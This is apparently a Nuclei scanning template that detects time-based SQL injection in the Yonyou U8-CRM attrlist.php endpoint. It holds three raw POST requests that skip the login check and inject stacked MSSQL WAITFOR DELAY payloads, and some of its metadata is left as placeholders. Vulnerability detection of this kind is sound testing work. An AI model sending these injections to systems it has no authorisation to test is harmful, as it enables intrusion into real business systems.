id: yongyou-U8-CRM-attrlist-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 用友U8-CRM系统接口attrlist存在SQL注入漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8-CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3attrlist%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded;

        obj_type=1';WAITFOR DELAY '0:0:3'--
      - |-
        POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded;

        obj_type=1';WAITFOR DELAY '0:0:6'--
      - |-
        POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded;

        obj_type=1';WAITFOR DELAY '0:0:9'--
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"